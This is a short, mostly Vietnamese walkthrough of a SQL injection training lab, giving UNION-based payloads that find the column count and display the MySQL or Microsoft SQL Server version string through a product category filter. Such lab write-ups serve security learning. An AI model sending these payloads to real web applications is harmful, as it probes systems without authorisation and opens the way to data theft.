# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

# Overview:

Lab này vẫn như lab trước, chỉ khác ở chỗ là `MySQL` và `Microsoft` nên là payload khác so với `oracle`.

Ta vẫn dùng UNION attack để làm cho database nhận 1 cái string gì đó

![image](https://user-images.githubusercontent.com/115911041/232261242-2e990972-afcc-4d99-b4ee-a01059c3c80a.png)

# Solution

Bước đầu xác định số column, tìm payload thích hợp cho version này

![image](https://user-images.githubusercontent.com/115911041/232261287-d27ac5d3-59d9-4724-b6f4-7a226d6ddc89.png)

`'+UNION+SELECT+'a','b'#`

![image](https://user-images.githubusercontent.com/115911041/232261750-419e8c2e-9728-48b7-a454-8e60bea32aed.png)

Lưu ý là sau khi nhập xong payload, ta cần tô đen `#` và crtl+u.

Bước tiếp theo là chọn payload thôi.

![image](https://user-images.githubusercontent.com/115911041/232261788-f76b53a3-7d6e-417b-a8ff-982697db5e7c.png)

`'+UNION+SELECT+@@version,+NULL#`

![image](https://user-images.githubusercontent.com/115911041/232261831-7f282c44-a785-41ce-a44f-529d1d439b6c.png)

![image](https://user-images.githubusercontent.com/115911041/232261839-e7a9f541-2c50-4b6f-b254-0a0efbd1bc39.png)

